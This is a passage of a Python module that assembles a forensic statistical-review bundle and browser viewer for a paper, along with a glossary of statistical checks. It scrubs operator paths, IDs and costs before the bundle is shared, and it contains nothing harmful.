"""Assemble a self-contained review bundle, and a browser viewer for it.

WHY A BUNDLE
------------
A review is currently nine JSON/markdown files in a directory next to the
paper. Everything needed to audit a finding exists -- the reproduction command,
the tool call that produced it, the sandbox audit proving nothing ran outside
the validated surface -- but reading it means opening several files and holding
the cross-references in your head. The bundle puts the paper, the extracted
text, the analysis, and the full chain of reasoning in one place, with one file
to open.

THE CONSTRAINT THAT SHAPES THE VIEWER
-------------------------------------
`file://` blocks `fetch`. A viewer that loads its data by fetching sibling
files works when served over HTTP and fails SILENTLY when the user
double-clicks it, which is how it will actually be opened. So the viewer
EMBEDS everything it renders and LINKS only what it hands off to another
program (the PDF, the raw message logs). Links work from `file://` because the
browser navigates rather than fetches.

That split also keeps the file responsive: the raw stage-1 message log is 1.1
MB of conversation, and embedding it would make the page slow to open in order
to show something nobody reads top to bottom. The distilled tool-call ledger,
which is what a reader actually wants, is embedded.
"""

from __future__ import annotations

import functools
import html
import json
import math
import re
import shutil
import sys
from pathlib import Path
from typing import Any

from . import scrub as _scrub_mod
from . import vignette as _vignette
from .disclaimer import ACTION_NOTE, DISCLAIMER_LONG, DISCLAIMER_SHORT
from .supplements import OVERRIDE_WARNING
from .tools.severity import SEVERITY_LEVELS
from . import finding_view as _fv

#: Tool results can be entire files (a `Read` of body.md is 67 kB). The ledger
#: is for seeing WHAT ran with WHICH inputs, so results are clipped.
_RESULT_CLIP = 2000

#: Copied into the bundle and linked, not embedded.
_PAPER_FILES = ("body.md", "abstract.md", "references.md", "references.json",
                "provenance.json")
#: Globbed rather than named, because the new fetch layout prefixes these with
#: the paper's DOI-derived stem.
_PAPER_GLOBS = ("*.xml", "*.provenance.json", "*_supplementary_info.json")
#: `tool_ledger.json` and `guard_audit.json` used to be listed here and were
#: never removed when the writers changed name. Nothing has ever written either
#: one: the ledger is `toolcalls.stage{1,2}.json`, and the guard audit is nested
#: at `sandbox_audit.stages.<stage>.guards`. The cost of the stale names was not
#: the dead copy but the Guards pane, which read the missing file and reported
#: "No guard audit recorded for this run" on every run ever produced.
_ANALYSIS_FILES = ("report.md", "findings.json", "report.json", "run_meta.json",
                   "sandbox_audit.json", "toolcalls.stage1.json",
                   "toolcalls.stage2.json", "messages.stage1.json",
                   "messages.stage2.json",
                   # The PARALLEL-era layout (v1.0.0+). Until 2026-08-22 none
                   # of these were copied, so a bundle of a current run
                   # archived everything EXCEPT the findings document itself.
                   "findings.v2.json", "adjudication.json",
                   "value_register.json",
                   "toolcalls.tool_agent.json", "toolcalls.science_agent.json",
                   "toolcalls.adjudicator.json",
                   "messages.tool_agent.json", "messages.science_agent.json",
                   "messages.adjudicator.json",
                   "prompt.tool_agent.md", "prompt.science_agent.md",
                   "prompt.adjudicator.md")

#: What each bundled file is for, in the reader's terms. Keyed by the name as it
#: appears in the bundle; the PDF and the XML are matched by suffix because
#: their stems are the paper's DOI.
_FILE_BLURBS = {
    "report.md": "The review itself -- what you would read.",
    "report.json": "The same review as structured fields, behind the prose.",
    "findings.json": "Every sweep finding, with its tool inputs and annotations.",
    "run_meta.json": "Cost, tokens, wall time and the model each stage actually used.",
    "sandbox_audit.json": "Whether every statistic came from a validated tool.",
    "toolcalls.stage1.json": "The ledger: each sweep tool call, its inputs and its result.",
    "toolcalls.stage2.json": "The ledger for the editorial stage.",
    "messages.stage1.json": "Full sweep transcript. Large, and rarely what you want.",
    "messages.stage2.json": "Full editorial transcript. Large.",
    "findings.v2.json": "Every finding with its final 1-9 severity and the "
                        "adjudicator's ruling -- the review's document of record.",
    "adjudication.json": "The adjudicator's raw output: per-finding verdicts "
                         "and the paper-level call.",
    "value_register.json": "Every value the paper printed, and which checks "
                           "reached it.",
    "toolcalls.tool_agent.json": "The tools agent's ledger: each call, inputs, result.",
    "toolcalls.science_agent.json": "The scientific proofreading agent's ledger, web calls included.",
    "toolcalls.adjudicator.json": "The adjudicator's spot-check ledger.",
    "messages.tool_agent.json": "Full tools-agent transcript. Large.",
    "messages.science_agent.json": "Full scientific proofreading agent transcript. Large.",
    "messages.adjudicator.json": "Full adjudicator transcript. Large.",
    "prompt.tool_agent.md": "The system prompt the tools agent was given.",
    "prompt.science_agent.md": "The system prompt the scientific proofreading agent was given.",
    "prompt.adjudicator.md": "The system prompt the adjudicator was given.",
    "body.md": "The paper's text as the checks saw it.",
    "abstract.md": "The abstract, extracted separately.",
    "references.md": "The reference list, as text.",
    "references.json": "The reference list, structured.",
    "provenance.json": "Where this paper came from and how it was converted.",
}


#: THE BUNDLE IS FORWARDABLE. It is built to be sent to the authors of the
#: paper it criticises, and until now it shipped the operator's machine with
#: it. MEASURED on `10.1002--eat.24415/forensic_review_wave3_bundle` before
#: this: `viewer.html` carried 24 occurrences of `/mnt/c/Users/gregs/...`, 21
#: of `/home/gsfitzgerald/...`, 21 session UUIDs and the run's
#: `total_cost_usd`. None of that is a fact about the paper, and an operator
#: who cannot see what they are forwarding cannot decide not to forward it.
#:
#: Home directories are collapsed to `<home>` rather than deleted, so a
#: reproduction command still reads as a path and stays runnable after the
#: reader substitutes their own checkout.
#:
#: The lookbehind keeps a URL out of it: `https://osf.io/home/xyz` has `/home/`
#: in it and is the PAPER's shared-data link, not our machine. A path we care
#: about always begins a token -- after a space, a quote, an `=`, or the `//`
#: of a `file://` URI -- never immediately after a word character or a dot.
# THE REGEXES AND `scrub` LIVE IN `scrub.py` NOW. They were defined here and
# applied only to the bundle's COPY of the review, so
# `forensic_review/report.md` -- the file `_FILE_BLURBS` calls "The review
# itself -- what you would read" -- shipped operator home paths. Three
# surfaces need the identical function; one definition.
_HOME_RE = _scrub_mod.HOME_RE
_UUID_RE = _scrub_mod.UUID_RE

#: The paper's own text is EVIDENCE and is left byte-exact: a substitution
#: inside it would move every character offset the click-to-source sync does
#: arithmetic on, so a finding's anchor would land on the wrong sentence.
_UNSCRUBBED_KEYS = ("body_text", "body_html")


#: Re-exported: callers and tests import `bundle.scrub`.
scrub = _scrub_mod.scrub


#: Named exactly, NOT matched on the substring "cost". A finding's `inputs` on
#: a health-economics paper can legitimately carry `mean_cost` or `cost_per_qaly`,
#: and dropping one of those would delete the evidence under a finding -- a
#: worse failure than the leak this is here to close. These three are every key
#: `run_meta` writes a price into: the run total, the per-stage cost, and the
#: vendor's own spelling inside `model_usage`.
_OPERATOR_KEYS = frozenset({"total_cost_usd", "cost_usd", "costusd",
                            "session_id", "uuid",
                            # A GRADE ON US, SHIPPED TO THE AUTHOR. `title_quality`
                            # scores whether the MODEL followed our finding-title
                            # spec -- noun-phrase shape, a 90-character cap, one
                            # defect per title. `deterministic.check_titles` says
                            # in its own docstring that the result is "deliberately
                            # not [written] to the shipped bundle", and
                            # `OPERATOR_ONLY` in tests/test_output_is_read.py
                            # records the same decision.
                            #
                            # It was in 8 of 8 shipped bundles. The test pinned
                            # that an operator READS the field and never that the
                            # bundle EXCLUDES it, so the half that mattered was
                            # unenforced -- the decision was documented twice and
                            # implemented nowhere.
                            #
                            # Greg found it by reading the page and asking what it
                            # meant, which is the fair question: a panel headed
                            # "title quality" sitting in a review of someone's
                            # paper reads as a criticism of THEIR title. It is not.
                            "title_quality"})


def _is_operator_key(key: Any) -> bool:
    """Keys whose VALUE is about the operator, not the paper.

    What the review cost us, forwarded to an author, reads as a price put on
    the accusation; it also leaks our spend. The numbers stay in the review
    directory's `run_meta.json`, which is not the shippable artefact.
    """
    return str(key).lower() in _OPERATOR_KEYS


def _scrub(value: Any) -> Any:
    """Recursively scrub strings, drop operator-only keys, null out non-finite floats.

    NaN AND INFINITY ARE NOT VALID JSON, and while Python's `json.dumps` emits
    them as the bare tokens `NaN`/`Infinity`, the browser's `JSON.parse` is
    strict and throws on them. The whole viewer is
    `const D = JSON.parse(document.getElementById('payload').textContent)`, so a
    single non-finite number anywhere in the payload blanks the ENTIRE page --
    every section reads from D. A forensic check that could not compute a value
    (a divide-by-zero, an SD of a single point) is exactly where a NaN comes
    from, so this is reachable from real input, not just a hostile one.
    Reproduced: a finding with computed.tau_hat = float("nan") made the payload
    unparseable in a browser. Null is the honest rendering -- the value is
    undefined, and the viewer's `val()` already shows null as blank.
    """
    if isinstance(value, str):
        return scrub(value)
    if isinstance(value, float) and not math.isfinite(value):
        return None
    if isinstance(value, dict):
        return {k: _scrub(v) for k, v in value.items() if not _is_operator_key(k)}
    if isinstance(value, (list, tuple)):
        return [_scrub(v) for v in value]
    return value


def _load(path: Path) -> Any:
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return None


def _read_text(path: Path, limit: int = 8000) -> str:
    """A plain-text sidecar, or "" if there is none.

    Separate from `_load` because these files are NOT json -- they are the
    written-out reasons a stage failed, and `_load` would return None for every
    one of them.
    """
    try:
        return path.read_text(encoding="utf-8", errors="replace")[:limit]
    except OSError:
        return ""


def _guards_by_stage(sandbox: dict | None) -> dict:
    """The guard audit, from where it is actually written.

    `_guard_audit` runs on every stage of every run and nests its result at
    `sandbox_audit.stages.<stage>.guards`. The viewer used to look for a
    top-level `guard_audit.json`, which nothing writes, so the pane said "No
    guard audit recorded for this run" even when -- as on the run this was
    found on -- 7 of 9 guard slots had been supplied and the per-tool breakdown
    was sitting in the file next to it.
    """
    stages = (sandbox or {}).get("stages")
    if not isinstance(stages, dict):
        return {}
    return {name: st["guards"] for name, st in stages.items()
            if isinstance(st, dict) and isinstance(st.get("guards"), dict)}


#: `NCT` numbers carry eight digits. One with the wrong count is printed but
#: unresolvable, which is a more useful thing to report than silence.
_MALFORMED_REGISTRY = re.compile(r"\bNCT\s?\d{1,7}\b|\bNCT\s?\d{9,}\b")

#: The extractor writes full-page renders alongside figure crops in the same
#: directory, so anything counting files in `figures/` counts these too.
_PAGE_RENDER = re.compile(r"^page[_-]?\d+\.(png|jpg|jpeg|webp)$", re.I)


def _backfill_repro_split(meta: dict, findings: list[dict], report: dict) -> None:
    """Recompute the reproduction taxonomy for a bundle built from an OLD run.

    NOT a rewrite of the archive: the classification is deterministic and every
    input is already in the payload -- each finding's own `reproduction` string.
    This computes a derived view at render time, and leaves the review
    directory's `run_meta.json` untouched.

    Without it, a bundle rebuilt from a run that predates the split shows only
    `n_valid`/`n_invalid` and the page falls back to saying less. Saying less is
    honest, but it is not necessary here, because the fact needed to say more is
    sitting in the payload.

    `n_ran_ok` and friends are NOT recomputed -- executing a command is not
    something a rebuild may do behind the operator's back.
    """
    if not isinstance(meta, dict) or "n_no_command_applies" in meta:
        return
    try:
        from .evaluation.deterministic import classify_reproduction
    except Exception:  # noqa: BLE001 -- a missing evaluator must not break a bundle
        return
    cmds = [f.get("reproduction") or "" for f in (findings or [])
            if isinstance(f, dict)]
    cmds += [f.get("reproduction") or "" for f in ((report or {}).get("findings") or [])
             if isinstance(f, dict)]
    head = ((report or {}).get("headline") or {}).get("reproduction")
    if head:
        cmds.append(head)
    if not cmds:
        return
    none = sum(1 for c in cmds if classify_reproduction(c) == "no_command_applies")
    meta["n_no_command_applies"] = none
    meta["n_command_expected"] = len(cmds) - none
    meta["backfilled"] = (
        "This run predates the three-way split, so `n_no_command_applies` and "
        "`n_command_expected` were recomputed from the findings' own "
        "reproduction strings when the bundle was built. The executed counts "
        "are the run's own and were not recomputed."
    )


def _reported_ids(findings: list[dict], editorial: list[dict]) -> set[str]:
    """Which findings reached the report, by whichever record exists.

    THE EDITORIAL LIST COMES FROM `report.json`, WHICH THE PARALLEL PATH NEVER
    WRITES. `grep -c "report.json" parallel.py` returns 0, so `report_obj` is
    `{}`, `editorial` is `[]`, and `[] is not None` slips the guard below. Every
    row then showed `kept: 0` and the Sankey's only outcome node read
    `not reported (34)`.

    MEASURED on the current ajcp run: the adjudicator RAN, kept 22 and merged 8,
    `report.md` carries FIFTEEN finding headings, and the viewer told a reader
    that none of the 34 reached the report.

    A v2 row records its own fate in `adjudication.action`, so that is the
    record to read when there is no editorial list. The rule is IMPORTED from
    `report_v2` rather than restated -- it is the renderer's own definition of
    what it prints, and a second copy here would drift from it exactly as the
    `report.json` assumption did.

    Note also the key: this function matches on `finding_id`, which is what a v2
    row carries. The editorial path read `id`, so even a populated list would
    not have matched a v2 finding.
    """
    if editorial:
        return {str(i) for e in editorial if isinstance(e, dict)
                for i in (e.get("stage1_finding_ids") or [])}
    try:
        from .report_v2 import reported_finding_ids
        return reported_finding_ids({"findings": findings})
    except Exception:  # noqa: BLE001
        return set()


def _check_table(calls: list[dict], findings: list[dict],
                 editorial: list[dict]) -> list[dict]:
    """One row per check: how often it ran, what it found, what survived.

    The same data the Sankey draws, in the form you can actually read a number
    out of. The diagram shows the SHAPE of the flow; a reader asking "how many
    times did GRIM run and how many of its findings made the report" needs the
    table.
    """
    try:
        from .severity_reconcile import _candidate_tools
    except Exception:
        return []

    kept_ids: set[str] = _reported_ids(findings, editorial)

    rows: dict[str, dict] = {}

    def row(tool: str) -> dict:
        return rows.setdefault(tool, {
            "check": tool, "calls": 0, "findings": 0, "kept": 0, "severities": {},
            "tool_verdicts": {},
        })

    for c in calls or []:
        if isinstance(c, dict) and c.get("validated") and c.get("tool"):
            r = row(c["tool"])
            r["calls"] += 1
            # THE TOOL'S OWN VERDICT, which is a different quantity from the
            # severity the write-up gave it and was reachable nowhere.
            #
            # Greg, 2026-08-10: consistent checks "ought to be classified as
            # trustworthy in the accounting, even if they are omitted from the
            # main report". They were not in the accounting at all -- the
            # severities column counted the MODEL'S findings, so a check that
            # ran 43 times and passed 21 of them showed a column summing to 4.
            #
            # MEASURED on 10.1038/s41537-025-00576-3: `check_estimate_ci` ran 43
            # times returning 21 `consistent` and 22 `indeterminate`, and the
            # page showed neither. Worse in the other direction --
            # `grim_percentage` returned `impossible` twice and `grim_sweep`
            # once, while the report's tally showed no `impossible` anywhere. A
            # reader could not see that three checks had said the strongest
            # thing this toolkit can say and the review had not carried it.
            sev = c.get("severity")
            if sev:
                r["tool_verdicts"][sev] = r["tool_verdicts"].get(sev, 0) + 1

    for f in findings or []:
        if not isinstance(f, dict):
            continue
        tool = next((t for t in _candidate_tools(f.get("technique")) if t in rows),
                    "hand-computed")
        r = row(tool)
        r["findings"] += 1
        sev = f.get("severity") or "indeterminate"
        r["severities"][sev] = r["severities"].get(sev, 0) + 1
        # ONE READER for the row's identity (v1 `id`, v2 `finding_id`, card copy).
        if _fv.ref(f) in kept_ids:
            r["kept"] += 1

    return sorted(rows.values(),
                  key=lambda r: (-r["findings"], -r["calls"], r["check"]))


def _sankey(calls: list[dict], findings: list[dict],
            editorial: list[dict] | None = None) -> dict:
    """Which check produced which verdict, as a flow.

    Two columns: the tool on the left, the severity it returned on the right,
    one unit of flow per finding. A tool that was called and yielded no finding
    flows to an explicit `no finding` sink, because "ran and found nothing" and
    "never ran" are different facts and a diagram that omits the first implies
    the second.

    The technique-to-tool mapping is `severity_reconcile._candidate_tools`, not
    a second copy of it. That map exists because a `technique` names a FAMILY
    -- the model writes `grim` having called `grim_percentage` -- and getting
    it wrong here would mis-attribute findings to tools that never ran.
    """
    try:
        from .severity_reconcile import _candidate_tools
    except Exception:
        return {"nodes": [], "links": []}

    called: dict[str, int] = {}
    for c in calls or []:
        if isinstance(c, dict) and c.get("validated") and c.get("tool"):
            called[c["tool"]] = called.get(c["tool"], 0) + 1

    flows: dict[tuple[str, str], int] = {}
    attributed: set[str] = set()
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        technique = f.get("technique")
        severity = f.get("severity") or "indeterminate"
        source = "hand-computed"
        for tool in _candidate_tools(technique):
            if tool in called:
                source, _ = tool, attributed.add(tool)
                break
        flows[(source, severity)] = flows.get((source, severity), 0) + 1

    for tool, n in called.items():
        if tool not in attributed:
            flows[(tool, "no finding")] = flows.get((tool, "no finding"), 0) + n

    lefts = sorted({s for s, _ in flows}, key=lambda s: -sum(
        v for (a, _), v in flows.items() if a == s))
    rights = [s for s in SEVERITY_LEVELS if any(t == s for _, t in flows)]
    # THE ADAPTER'S OWN VOCABULARY. `_v2_container` renders a 1-9 rung as the
    # string "S<n>", which is not in SEVERITY_LEVELS, so on a v2 bundle every
    # accusation's flow pointed at a target with no node and the JS dropped
    # the ribbon (`if(!a||!b) return ''`). MEASURED on litvak05 (v1.22.0):
    # 13 of 29 links targeted S1..S4 and the diagram showed only
    # `indeterminate` and `no finding`. Carried as nodes, worst rung first.
    rights += sorted(
        {t for _, t in flows if t not in SEVERITY_LEVELS and t != "no finding"},
        key=lambda t: (-(_fv.severity_level({"severity": t}) or 0), t))
    rights += [t for _, t in flows if t == "no finding"][:1]

    # The left column's number USED to be `tot(id)`, which is findings for a
    # tool that produced some and CALLS for one that produced none -- two
    # units in one column. `multiplicity_report (2)` meant 2 findings from 5
    # calls and `extract_pdf (2)` meant 2 calls and no findings, sitting next
    # to each other, directly under a table that distinguishes them. Both
    # counts now ride on the node.
    nodes = ([{"id": s, "label": s, "column": 0,
               "calls": called.get(s, 0),
               "findings": sum(v for (a, t), v in flows.items()
                               if a == s and t != "no finding")}
              for s in lefts]
             + [{"id": t, "label": t.replace("_", " "), "column": 1} for t in rights])
    links = [{"source": s, "target": t, "value": v}
             for (s, t), v in sorted(flows.items(), key=lambda kv: -kv[1])]

    # A THIRD column: what the editorial stage did with each severity. Without
    # it the diagram stops at "the sweep found this", which is not the same as
    # "the report says this" -- and on every run so far a substantial share of
    # sweep findings are dropped or merged, invisibly.
    # Same source and same key as the check table -- see `_reported_ids`. This
    # read `report.json`'s editorial list, which the parallel path never writes,
    # and matched on `id` where a v2 row carries `finding_id`. Both wrong the
    # same way, so the only outcome node on every parallel run was
    # `not reported (34)`.
    if editorial is not None:
        kept_ids = _reported_ids(findings or [], editorial)
        fate: dict[tuple[str, str], int] = {}
        for f in findings or []:
            if not isinstance(f, dict):
                continue
            sev = f.get("severity") or "indeterminate"
            fid = _fv.ref(f)
            where = "reported" if fid in kept_ids else "not reported"
            fate[(sev, where)] = fate.get((sev, where), 0) + 1
        if fate:
            for label in ("reported", "not reported"):
                if any(w == label for _, w in fate):
                    nodes.append({"id": label, "label": label, "column": 2})
            links += [{"source": s, "target": w, "value": v}
                      for (s, w), v in sorted(fate.items(), key=lambda kv: -kv[1])]

    return {"nodes": nodes, "links": links}


def _xml_metadata(paper_dir: Path) -> dict:
    """Bibliographic metadata read from the source XML at bundle time.

    The run records whatever `article_metadata` returned when it executed, so a
    review produced before volume, issue, pages and the corresponding author
    were extracted carries none of them. Reading the XML here fills those in
    without a re-run -- it is the same function against the same file, and the
    values are the paper's, not the analysis's.
    """
    try:
        import xml.etree.ElementTree as ET

        from .extraction.jats import article_metadata, find_xml
        xml = find_xml(paper_dir)
        if xml is None:
            return {}
        return article_metadata(ET.parse(xml).getroot())
    except Exception:
        return {}


#: ONE DEFINITION, in `numerals`, because the same line is both a thing to
#: splice a grid back into (here) and a source of digits that are OURS and not
#: the paper's (the floor). Two copies would disagree the day one is edited.
from .numerals import TABLE_PLACEHOLDER as _TABLE_PLACEHOLDER


def _md_table(grid: list[list]) -> str:
    """A grid as a markdown pipe table.

    Cells are escaped for `|`, which would otherwise open a phantom column and
    silently shift every value in the row one place left -- the exact class of
    error this pane exists to reveal.
    """
    if not grid:
        return ""
    width = max(len(r) for r in grid)
    def row(cells):
        padded = list(cells) + [""] * (width - len(cells))
        return "| " + " | ".join(
            str(c or "").replace("|", "\\|").replace("\n", " ") for c in padded) + " |"
    head, *body = grid
    return "\n".join([row(head), "|" + "---|" * width] + [row(r) for r in body])


def _body_html(paper_dir: Path, body_text: str) -> str:
    """The extracted text as HTML, with the real tables spliced in.

    The XML path deliberately keeps table content OUT of the running text and
    emits `[TABLE 1: ... ; see tables]` in its place, so that a model cannot
    transcribe numbers from prose that has already lost the column alignment.
    That is right for the checks and wrong for this pane, whose whole purpose
    is letting a reader see whether the tables survived extraction -- of which
    a placeholder line shows nothing at all.

    So the grids are put back, from the structured extraction rather than from
    a markdown reflow of it. The reader sees the same cells the checks saw.
    """
    text = body_text or ""
    tables: list[dict] = []
    try:

        from .extraction.jats import extract_xml_text_with_tables, find_xml
        xml = find_xml(paper_dir)
        if xml is not None:
            # Full grids: this splices the real tables into the rendered view,
            # so an index would defeat the purpose. Nothing crosses a tool
            # boundary here -- it is a local read at bundle time.
            out = extract_xml_text_with_tables(str(xml), tables="full")
            tables = [t for t in (out.get("tables") or []) if isinstance(t, dict)]
    except Exception:
        tables = []

    by_label = {}
    for t in tables:
        key = (t.get("label") or f"Table {t.get('table_num')}").strip().lower()
        by_label[key] = t

    def splice(m: "re.Match") -> str:
        t = by_label.get(m.group("name").strip().lower())
        grid = (t or {}).get("data") or []
        if not grid:
            return (f"**{m.group('name')}.** {m.group('caption')}\n\n"
                    f"_Not reproduced here: {m.group('shape')}._")
        return (f"**{m.group('name')}.** {m.group('caption')}\n\n"
                + _md_table(grid))

    # Rendered BLOCK BY BLOCK, each one carrying the character offset it starts
    # at IN THE RAW TEXT. Both panes' click-to-jump is offset arithmetic over
    # `pre.textContent`, so the rendered view -- which is the same document with
    # its offsets destroyed by markdown -- could not participate in it, and
    # clicking there did nothing. Splitting on blank lines and stamping each
    # block gives the rendered DOM the coordinates it was missing.
    #
    # The offset is into the ORIGINAL text, not the spliced one: the splice
    # replaces a one-line placeholder with a whole grid, so any offset computed
    # after it would point into a document the raw pane is not showing.
    out: list[str] = []
    for start, block in _blocks(text):
        rendered = _report_html(_TABLE_PLACEHOLDER.sub(splice, block))
        if rendered.strip():
            out.append(f'<div class="blk" data-src-offset="{start}">{rendered}</div>')
    return "\n".join(out)


#: A markdown block is what a blank line separates. Good enough for a paper's
#: body text, where the constructs are paragraphs, headings and tables.
_BLANK_LINE = re.compile(r"\n[ \t]*\n")


def _blocks(text: str) -> list[tuple[int, str]]:
    """`(character offset, block text)` for each blank-line-separated block."""
    out: list[tuple[int, str]] = []
    pos = 0
    for chunk in _BLANK_LINE.split(text or ""):
        start = (text or "").find(chunk, pos) if chunk else pos
        if start < 0:
            start = pos
        if chunk.strip():
            out.append((start, chunk))
        pos = start + len(chunk)
    return out


#: "Positive and Negative Affect Schedule (PANAS)" -- the definition sits
#: immediately before the parenthesis, which is how papers introduce a term.
#: 2-6 characters, at least two capitals, so "(1988)", "(p < .05)" and "(SD)"
#: are not mistaken for acronyms being defined.
#: The bracket often carries a citation after the acronym --
#: "(PANAS; Watson et al. [1988])" -- so anything from the first `;` or `,` on
#: is discarded rather than preventing a match.
_ACRONYM = re.compile(
    r"((?:[A-Za-z][A-Za-z'’\-]*[ ]){1,9})"          # the words before the bracket
    r"\(\s*([A-Z][A-Za-z0-9\-]{1,7})\s*(?=[;,)])")  # the short form
_ACRONYM_STOP = frozenset({
    "SD", "SE", "CI", "IQR", "SEM", "OR", "RR", "HR", "AND", "THE",
    "USA", "UK", "US", "NIH", "PDF", "DOI", "ANOVA", "SPSS",
})
#: Skipped when lining initials up: no paper expects "of" to contribute a
#: letter to its own acronym.
_ACRONYM_SKIP = frozenset({"and", "of", "for", "the", "in", "to", "with",
                           "on", "a", "an", "at"})


def _acronyms(body_text: str) -> list[dict]:
    """Every acronym the paper defines, with the words it stands for.

    Deterministic, not model-authored: papers introduce a term by writing it
    out and putting the short form in brackets after it, and that is a pattern
    rather than a judgement. Doing it in code means it costs nothing per run
    and cannot be hallucinated -- an invented expansion of a clinical acronym
    would be worse than none.

    The expansion is trimmed to the initials that actually match, so
    "assessed participants' affect using the Positive and Negative Affect
    Schedule (PANAS)" yields the schedule and not the sentence.
    """
    def initials(words: list[str], skip: bool) -> list[str]:
        # Hyphenated words contribute one letter per part: "just-in-time"
        # supplies the J, I and T of JITAI.
        #
        # `skip` is tried BOTH ways by the caller, because connecting words are
        # sometimes in the acronym and sometimes not: the A of PANAS is the
        # "and" of "Positive and Negative Affect Schedule", while the "of" in
        # "Difficulties in Emotion Regulation Scale" contributes nothing. No
        # single rule covers both, and guessing one loses half the acronyms.
        out: list[str] = []
        for w in words:
            for part in re.split(r"[-‐-―]", w):
                part = part.strip("'’")
                if part and not (skip and part.lower() in _ACRONYM_SKIP):
                    out.append(part[0].lower())
        return out

    seen: dict[str, dict] = {}
    for m in _ACRONYM.finditer(body_text or ""):
        words = m.group(1).split()
        acro = m.group(2).strip()
        if acro.upper() in _ACRONYM_STOP or sum(c.isupper() for c in acro) < 2:
            continue
        # Only the CAPITALS carry the mapping: "CBTgsh" is an acronym of three
        # words with a lowercase qualifier stuck on, and demanding six matching
        # words would reject it.
        letters = [c.lower() for c in acro if c.isupper()]
        if not letters:
            continue

        # The SHORTEST trailing phrase whose initials spell the acronym. Longer
        # ones also match by prefix, and taking the first would swallow half
        # the sentence -- how "individuals' engagement in disordered eating
        # behaviors" came to stand for DEBs.
        best = ""
        for k in range(1, len(words) + 1):
            take = words[-k:]
            if any(initials(take, skip) == letters for skip in (True, False)):
                best = " ".join(take)
                break
        if not best:
            continue
        if acro not in seen:
            seen[acro] = {"acronym": acro, "expansion": best}
    return sorted(seen.values(), key=lambda a: a["acronym"].lower())


#: Statistical problems in plain language, each with a worked example and the
#: checks in this toolkit that bear on it.
#:
#: Written here rather than asked of the model: these are properties of the
#: METHOD, identical from paper to paper, so paying to regenerate them per run
#: would be both wasteful and a licence to drift. `detects` names real
#: registered tools, so a reader can go from "what is this problem" to "what
#: did you actually run".
GLOSSARY = (
    {"term": "Multiple comparisons",
     "plain": "Running many tests and treating each as if it were the only one. "
              "Test twenty things at the usual threshold and, on average, one "
              "comes out 'significant' by luck alone.",
     "example": "Twenty subgroups, one p = .04, reported as a discovery. That "
                "is the expected number of false positives at alpha = .05.",
     "detects": ("multiplicity_report",)},
    {"term": "Benjamini-Hochberg (BH)",
     "plain": "A way of adjusting for multiple comparisons that controls the "
              "share of your 'discoveries' that are false, rather than the "
              "chance of any false discovery at all. Less strict than "
              "Bonferroni, and usually the more sensible of the two.",
     "example": "Six significant results; after BH, four survive. The other "
                "two are the ones the correction says you cannot rely on.",
     "detects": ("multiplicity_report",)},
    {"term": "Bonferroni correction",
     "plain": "The strictest common correction: divide your threshold by the "
              "number of tests. Safe, and often so conservative that real "
              "effects are missed.",
     "example": "Twenty tests means each needs p < .0025 rather than p < .05.",
     "detects": ("multiplicity_report",)},
    {"term": "Family-wise error rate",
     "plain": "The chance that AT LEAST ONE test in a family comes out "
              "'significant' by luck alone. It grows with every extra test, "
              "which is the whole reason corrections exist: Bonferroni "
              "controls exactly this quantity.",
     "example": "One test at the usual threshold risks a 5% false alarm; "
                "twenty independent ones together risk about 64%.",
     "detects": ("multiplicity_report",)},
    {"term": "Granularity",
     "plain": "Averages of whole numbers cannot land anywhere. With 20 people "
              "answering 1-5, the mean moves in steps of 1/20 -- so some "
              "printed averages are arithmetically impossible.",
     "example": "A mean of 3.47 from 20 integer responses. No set of answers "
                "produces it.",
     "detects": ("grim_check", "grim_percentage", "grimmer_check", "debit_check")},
    {"term": "Clustering",
     "plain": "When measurements come in groups -- several from each patient, "
              "or each clinic -- they are not independent, and treating them as "
              "if they were makes results look more certain than they are.",
     "example": "Fifty observations from ten people is not fifty independent "
                "data points.",
     "detects": ("multiplicity_report",)},
    {"term": "Multicollinearity",
     "plain": "Two predictors that measure nearly the same thing. The model "
              "cannot tell their effects apart, so individual coefficients "
              "become unstable and can even flip sign.",
     "example": "Two questionnaires correlated at r = .95 entered together; "
                "each 'effect' is really the pair's.",
     "detects": ()},
    {"term": "SD versus SE",
     "plain": "The standard deviation describes how spread out the people are; "
              "the standard error describes how precisely you know the average. "
              "The SE is always the smaller, by a factor of the square root of "
              "the sample size, and swapping them makes results look far more "
              "precise than they are.",
     "example": "'Mean 12.4 (0.3)' with n = 100: as an SD that is implausibly "
                "tight, as an SE it is ordinary.",
     "detects": ("check_sd_or_se", "check_sd_range")},
    {"term": "Rounding",
     "plain": "Every printed number has been rounded, so a recomputed value is "
              "a RANGE, not a point. A check that ignores this accuses correct "
              "arithmetic of being wrong.",
     "example": "B = 0.11 and SE = 0.05 are consistent with any t between "
                "about 1.9 and 2.9.",
     "detects": ("check_regression", "check_summation", "statcheck")},
    {"term": "p-value inconsistency",
     "plain": "The p-value printed beside a test statistic can be recomputed "
              "from it. When the two disagree, one of them is wrong.",
     "example": "t(28) = 2.10 reported as p = .002; the actual value is .045.",
     "detects": ("statcheck",)},
    {"term": "Absence of evidence",
     "plain": "A non-significant result does not show there is no effect. It "
              "shows the study could not tell -- and how large an effect it "
              "still permits is a separate question with a real answer.",
     "example": "'No difference between groups' from a study that could only "
                "have detected a very large one.",
     "detects": ("absence_of_evidence", "verify_power_analysis")},
    {"term": "Baseline similarity",
     "plain": "Randomised groups should differ a little by chance. Groups that "
              "match TOO closely across many measures are as suspicious as "
              "groups that differ too much.",
     "example": "Fifteen baseline characteristics, all near-identical across "
                "arms, in a trial of ninety people.",
     "detects": ("csf_test", "bayesian_table1_dispersion")},
    {"term": "Tau-hat",
     "plain": "The number the baseline-similarity check reports: how many "
              "times more precisely the groups agree than randomisation "
              "predicts. Near 1 is what chance produces; well above 1 means "
              "the arms match too closely across the baseline table.",
     "example": "tau-hat = 7.4 says the baseline rows agree about seven times "
                "more tightly than random assignment should allow.",
     "detects": ("bayesian_table1_dispersion",)},
    {"term": "Indeterminate",
     "plain": "Used throughout this report to mean the check REFUSED. Something "
              "it needed was missing, so it declined to judge. It is not "
              "evidence of a problem, and not evidence there is none.",
     "example": "GRIM needs the number of observations; the paper never prints "
                "it, so the check does not run.",
     "detects": ()},
)


def _artefacts_found(body_text: str) -> dict:
    """Repository and registration hits, or an empty result if the scan fails."""
    try:
        from . import artefacts
        return artefacts.find(body_text or "")
    except Exception:
        return {}


#: A paper justifying its sample size says so in one of these ways. Kept
#: deliberately narrow: "power" alone matches "statistical power" in a
#: discussion section, which is a remark about the literature, not a design
#: decision about this study.
_POWER_STATED = re.compile(
